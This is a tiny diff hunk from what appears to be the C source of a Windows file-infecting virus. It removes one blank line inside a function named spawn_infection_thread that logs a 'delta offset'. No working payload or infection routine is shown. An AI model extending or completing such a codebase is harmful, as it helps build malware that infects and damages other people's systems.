@@ -18,7 +18,6 @@ static DWORD WINAPI infection_thread(LPVOID param);
 void spawn_infection_thread(void) {
     asm volatile("nop\nnop\nnop");
     data_t *data = get_data();
-
     if (data != NULL) {
         PRINT_DEBUG("delta offset: 0x%X", data->delta_offset);
 
